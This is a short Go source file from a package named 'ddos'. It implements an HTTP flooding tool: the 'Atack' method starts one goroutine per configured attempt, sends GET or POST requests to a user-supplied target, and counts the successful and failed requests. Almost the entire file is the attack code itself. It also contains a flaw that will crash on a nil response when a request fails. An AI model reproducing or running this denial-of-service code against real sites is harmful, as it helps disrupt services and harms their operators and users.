package ddos

import (
	"net/http"
	"sync"
	"sync/atomic"

	"github.com/gnippets/ddos/pkg/cfg"
)

type DDoS struct {
	successRequest int64
	failedRequest  int64
	cfg            *cfg.Flagset
	wg             *sync.WaitGroup
}

func New(cfg *cfg.Flagset, wg *sync.WaitGroup) *DDoS {
	return &DDoS{
		cfg: cfg,
		wg:  wg,
	}
}

func (dd *DDoS) Atack() {
	for i := 0; i < dd.cfg.Attempts; i++ {
		go func(i int) {
			var resp *http.Response
			var err error

			if dd.cfg.Method == http.MethodGet {
				resp, err = http.Get(dd.cfg.Target)
			}

			if dd.cfg.Method == http.MethodPost {
				resp, err = http.Post(dd.cfg.Target, "application/json", nil)
			}

			if err == nil {
				atomic.AddInt64(&dd.successRequest, 1)
			} else {
				atomic.AddInt64(&dd.failedRequest, 1)
			}

			defer resp.Body.Close()
			dd.wg.Done()
		}(i)
	}
}
